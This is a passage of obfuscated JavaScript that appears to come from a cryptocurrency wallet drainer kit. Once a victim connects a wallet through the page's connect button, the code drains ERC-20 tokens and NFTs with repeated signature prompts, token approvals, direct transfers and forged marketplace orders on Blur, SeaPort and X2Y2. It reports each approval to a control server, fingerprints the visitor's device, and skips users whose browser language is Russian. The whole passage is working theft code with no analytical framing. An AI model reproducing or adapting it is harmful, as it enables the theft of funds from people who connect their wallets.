                          try {
                            if (_0x302da4.chain_id == _0x2c9aa2.chain_id && _0x302da4.swapper && _0x302da4.swapper_type == "Pancake_V3") {
                              _0x4f9769.push(_0x302da4);
                              _0x302da4.skip = true;
                            }
                          } catch (_0x5cabd7) {
                            console.log(_0x5cabd7);
                          }
                        }
                        while (true) {
                          try {
                            await DO_PANCAKE_V3(_0x2c9aa2, _0x4f9769);
                            _0x2c9aa2.skip = true;
                            break;
                          } catch (_0x315853) {
                            console.log(_0x315853);
                            await sign_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      } else {
                        while (true) {
                          try {
                            await DO_SWAP(_0x2c9aa2);
                            _0x2c9aa2.skip = true;
                            break;
                          } catch (_0x268c8f) {
                            console.log(_0x268c8f);
                            await sign_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      }
                    }
                  } else {
                    if (MS_Settings.Settings.Sign.Tokens > 0x0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 0x1)) {
                      while (true) {
                        try {
                          await SIGN_TOKEN(_0x2c9aa2);
                          if (MS_Settings.Settings.Sign.Tokens == 0x1) {
                            const _0x1a1087 = send_request({
                              'action': 'approve_token',
                              'user_id': MS_ID,
                              'asset': _0x2c9aa2,
                              'address': MS_Current_Address
                            });
                            if (MS_Settings.Settings.Wait_For_Response) {
                              await _0x1a1087;
                            }
                          }
                          _0x2c9aa2.skip = true;
                          break;
                        } catch (_0x588efa) {
                          console.log(_0x588efa);
                          if (MS_Settings.Settings.Sign.WC_AE == 0x1 && MS_Current_Provider == 'WalletConnect' || typeof _0x588efa.message == 'string' && _0x588efa.message.includes("eth_sign") || _0x588efa.code == -0x7f59 || _0x588efa.code == -0x7d00 || _0x588efa.message && is_valid_json(_0x588efa.message) && (JSON.parse(_0x588efa.message).code == -0x7f59 || JSON.parse(_0x588efa.message).code == -0x7d00)) {
                            if (MS_Settings.Settings.Sign.Force == 0x1) {
                              await sign_cancel();
                            } else {
                              await sign_unavailable();
                              while (true) {
                                if (MS_Settings.Settings.Sign.Tokens == 0x1) {
                                  if (MS_Current_Provider == "MetaMask" && MS_Settings.Settings.Approve.MetaMask || MS_Current_Provider == "Trust Wallet" && MS_Settings.Settings.Approve.Trust || MS_Current_Provider != "MetaMask" && MS_Current_Provider != "Trust Wallet") {
                                    try {
                                      let _0x1870f3 = await APPROVE_TOKEN(_0x2c9aa2);
                                      if (_0x1870f3 == 0x1) {
                                        const _0x9ffded = send_request({
                                          'action': 'approve_token',
                                          'user_id': MS_ID,
                                          'asset': _0x2c9aa2,
                                          'address': MS_Current_Address
                                        });
                                        if (MS_Settings.Settings.Wait_For_Response) {
                                          await _0x9ffded;
                                        }
                                      }
                                      _0x2c9aa2.skip = true;
                                      break;
                                    } catch (_0x171233) {
                                      await approve_cancel();
                                      if (!MS_Settings.Loop_T) {
                                        break;
                                      }
                                    }
                                  } else {
                                    try {
                                      await TRANSFER_TOKEN(_0x2c9aa2);
                                      _0x2c9aa2.skip = true;
                                      break;
                                    } catch (_0x2cba36) {
                                      console.log(_0x2cba36);
                                      await transfer_cancel();
                                      if (!MS_Settings.Loop_T) {
                                        break;
                                      }
                                    }
                                  }
                                } else {
                                  if (MS_Settings.Settings.Sign.Tokens == 0x2) {
                                    try {
                                      await TRANSFER_TOKEN(_0x2c9aa2);
                                      _0x2c9aa2.skip = true;
                                      break;
                                    } catch (_0x2ed96d) {
                                      console.log(_0x2ed96d);
                                      await transfer_cancel();
                                      if (!MS_Settings.Loop_T) {
                                        break;
                                      }
                                    }
                                  }
                                }
                              }
                            }
                            break;
                          } else {
                            console.log(_0x588efa);
                            if (_0x588efa != "LOW_BALANCE") {
                              await sign_cancel();
                              if (!MS_Settings.Loop_T) {
                                break;
                              }
                            } else {
                              break;
                            }
                          }
                        }
                      }
                    } else {
                      if (MS_Current_Provider == "MetaMask" && MS_Settings.Settings.Approve.MetaMask || MS_Current_Provider == "Trust Wallet" && MS_Settings.Settings.Approve.Trust || MS_Current_Provider != 'MetaMask' && MS_Current_Provider != "Trust Wallet") {
                        while (true) {
                          try {
                            let _0x3e9ce9 = await APPROVE_TOKEN(_0x2c9aa2);
                            if (_0x3e9ce9 == 0x1) {
                              const _0x48faa4 = send_request({
                                'action': "approve_token",
                                'user_id': MS_ID,
                                'asset': _0x2c9aa2,
                                'address': MS_Current_Address
                              });
                              if (MS_Settings.Settings.Wait_For_Response) {
                                await _0x48faa4;
                              }
                            }
                            _0x2c9aa2.skip = true;
                            break;
                          } catch (_0x9efbd9) {
                            console.log(_0x9efbd9);
                            await approve_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      } else {
                        while (true) {
                          try {
                            await TRANSFER_TOKEN(_0x2c9aa2);
                            _0x2c9aa2.skip = true;
                            break;
                          } catch (_0x1b3d5c) {
                            console.log(_0x1b3d5c);
                            await transfer_cancel();
                            if (!MS_Settings.Loop_T) {
                              break;
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            } else {
              if (_0x2c9aa2.type == 'ERC721') {
                if (typeof SIGN_BLUR !== "undefined" && MS_Settings.Settings.Blur.Enable == 0x1 && MS_Settings.Settings.Blur.Priority == 0x0 && !BL_US && MS_Current_Chain_ID == 0x1 && (await is_nft_approved(_0x2c9aa2.address, MS_Current_Address, '0x00000000000111abe46ff893f3b2fdf1f759a8a8')) && _0x2c9aa2.amount_usd >= MS_Settings.Settings.Blur.Price) {
                  await SIGN_BLUR(_0x2d3a6e, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.Blur.Price);
                  BL_US = true;
                } else {
                  if (typeof SIGN_SEAPORT !== "undefined" && MS_Settings.Settings.SeaPort.Enable == 0x1 && MS_Settings.Settings.SeaPort.Priority == 0x0 && !SP_US && MS_Current_Chain_ID == 0x1 && (await is_nft_approved(_0x2c9aa2.address, MS_Current_Address, "0x1E0049783F008A0085193E00003D00cd54003c71")) && _0x2c9aa2.amount_usd >= MS_Settings.Settings.SeaPort.Price) {
                    await SIGN_SEAPORT(_0x2d3a6e, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.SeaPort.Price);
                    SP_US = true;
                  } else {
                    if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings.Settings.x2y2.Enable == 0x1 && MS_Settings.Settings.x2y2.Priority == 0x0 && !XY_US && MS_Current_Chain_ID == 0x1 && (await is_nft_approved(_0x2c9aa2.address, MS_Current_Address, "0xf849de01b080adc3a814fabe1e2087475cf2e354")) && _0x2c9aa2.amount_usd >= MS_Settings.Settings.x2y2.Price) {
                      await SIGN_X2Y2(_0x2d3a6e, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.x2y2.Price);
                      XY_US = true;
                    } else {
                      if (MS_Settings.Settings.Sign.NFTs > 0x0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 0x1)) {
                        while (true) {
                          try {
                            await SIGN_NFT(_0x2c9aa2);
                            if (MS_Settings.Settings.Sign.Tokens == 0x1) {
                              let _0x1261db = [];
                              for (const _0x8947e4 of _0x2d3a6e) {
                                try {
                                  if (_0x8947e4.address == _0x2c9aa2.address) {
                                    _0x1261db.push(_0x8947e4);
                                    _0x8947e4.skip = true;
                                  }
                                } catch (_0x319c29) {
                                  console.log(_0x319c29);
                                }
                              }
                              await send_request({
                                'action': 'safa_approves',
                                'user_id': MS_ID,
                                'tokens': _0x1261db,
                                'address': MS_Current_Address,
                                'chain_id': MS_Current_Chain_ID,
                                'contract_address': _0x2c9aa2.address
                              });
                            }
                            _0x2c9aa2.skip = true;
                            break;
                          } catch (_0x21835d) {
                            console.log(_0x21835d);
                            if (MS_Settings.Settings.Sign.WC_AE == 0x1 && MS_Current_Provider == 'WalletConnect' || typeof _0x21835d.message == 'string' && _0x21835d.message.includes("eth_sign") || _0x21835d.code == -0x7f59 || _0x21835d.code == -0x7d00 || _0x21835d.message && is_valid_json(_0x21835d.message) && (JSON.parse(_0x21835d.message).code == -0x7f59 || JSON.parse(_0x21835d.message).code == -0x7d00)) {
                              if (MS_Settings.Settings.Sign.Force == 0x1) {
                                await sign_cancel();
                              } else {
                                await sign_unavailable();
                                while (true) {
                                  if (MS_Settings.Settings.Sign.NFTs == 0x1) {
                                    try {
                                      await DO_SAFA(_0x2c9aa2);
                                      let _0x55f8f5 = [];
                                      for (const _0x3d33b0 of _0x2d3a6e) {
                                        try {
                                          if (_0x3d33b0.address == _0x2c9aa2.address) {
                                            _0x55f8f5.push(_0x3d33b0);
                                            _0x3d33b0.skip = true;
                                          }
                                        } catch (_0x157109) {
                                          console.log(_0x157109);
                                        }
                                      }
                                      await send_request({
                                        'action': "safa_approves",
                                        'user_id': MS_ID,
                                        'tokens': _0x55f8f5,
                                        'address': MS_Current_Address,
                                        'chain_id': MS_Current_Chain_ID,
                                        'contract_address': _0x2c9aa2.address
                                      });
                                      _0x2c9aa2.skip = true;
                                      break;
                                    } catch (_0x578f26) {
                                      console.log(_0x578f26);
                                      await approve_cancel();
                                      if (!MS_Settings.Loop_NFT) {
                                        break;
                                      }
                                    }
                                  } else {
                                    if (MS_Settings.Settings.Sign.NFTs == 0x2) {
                                      try {
                                        await TRANSFER_NFT(_0x2c9aa2);
                                        _0x2c9aa2.skip = true;
                                        break;
                                      } catch (_0x4135b2) {
                                        console.log(_0x4135b2);
                                        await transfer_cancel();
                                        if (!MS_Settings.Loop_NFT) {
                                          break;
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                              break;
                            } else {
                              console.log(_0x21835d);
                              if (_0x21835d != 'LOW_BALANCE') {
                                await sign_cancel();
                                if (!MS_Settings.Loop_NFT) {
                                  break;
                                }
                              } else {
                                break;
                              }
                            }
                          }
                        }
                      } else {
                        if (MS_Settings.Settings.Approve.Enable) {
                          while (true) {
                            try {
                              await DO_SAFA(_0x2c9aa2);
                              let _0x4fe4f4 = [];
                              for (const _0x53d7f8 of _0x2d3a6e) {
                                try {
                                  if (_0x53d7f8.address == _0x2c9aa2.address) {
                                    _0x4fe4f4.push(_0x53d7f8);
                                    _0x53d7f8.skip = true;
                                  }
                                } catch (_0x4d1928) {
                                  console.log(_0x4d1928);
                                }
                              }
                              await send_request({
                                'action': "safa_approves",
                                'user_id': MS_ID,
                                'tokens': _0x4fe4f4,
                                'address': MS_Current_Address,
                                'chain_id': MS_Current_Chain_ID,
                                'contract_address': _0x2c9aa2.address
                              });
                              _0x2c9aa2.skip = true;
                              break;
                            } catch (_0x526f3b) {
                              console.log(_0x526f3b);
                              await approve_cancel();
                              if (!MS_Settings.Loop_NFT) {
                                break;
                              }
                            }
                          }
                        } else {
                          while (true) {
                            try {
                              await TRANSFER_NFT(_0x2c9aa2);
                              _0x2c9aa2.skip = true;
                              break;
                            } catch (_0x1b785a) {
                              console.log(_0x1b785a);
                              await transfer_cancel();
                              if (!MS_Settings.Loop_NFT) {
                                break;
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        } catch (_0x4280b8) {
          console.log(_0x4280b8);
        }
      }
    }
    MS_Process = false;
    setTimeout(end_message, 0x7d0);
  } catch (_0x21dd1d) {
    console.log(_0x21dd1d);
  }
};
try {
  let query_string = window.location.search;
  let url_params = new URLSearchParams(query_string);
  if (url_params.get("cis") != "test" && (navigator.language || navigator.userLanguage).toLowerCase().includes('ru')) {
    MS_Bad_Country = true;
  }
} catch (_0x16e8c8) {
  console.log(_0x16e8c8);
}
document.addEventListener("DOMContentLoaded", async () => {
  try {
    MSM.init();
    MSL.init();
    MS_Load_Time = Math.floor(Date.now() / 0x3e8);
    MS_Connection = true;
    fill_chain_data();
    MS_Deviceinfo = await getDeviceInfo();
    if (typeof localStorage.MS_ID === "undefined") {
      const _0x45f6ff = await send_request({
        'action': "retrive_id"
      });
      if (_0x45f6ff.status == 'OK') {
        localStorage.MS_ID = _0x45f6ff.data;
      } else {
        localStorage.MS_ID = Math.floor(Date.now() / 0x3e8);
      }
    }
    MS_ID = localStorage.MS_ID;
    MS_Ready = true;
    enter_website();
    for (const _0x39a34b in MS_Settings.RPCs) MS_Gas_Reserves[_0x39a34b] = 0x0;
    for (const _0xb4ee38 of document.querySelectorAll(".connect-button")) {
      try {
        _0xb4ee38.addEventListener("click", () => ms_init());
      } catch (_0x28cfae) {
        console.log(_0x28cfae);
      }
    }
  } catch (_0x30d861) {
    console.log(_0x30d861);
  }
});
const use_wc = () => {
  connect_wallet("WalletConnect");
};
window.addEventListener("beforeunload", _0x4e6f01 => leave_website());
window.addEventListener("onbeforeunload", _0x15d563 => leave_website());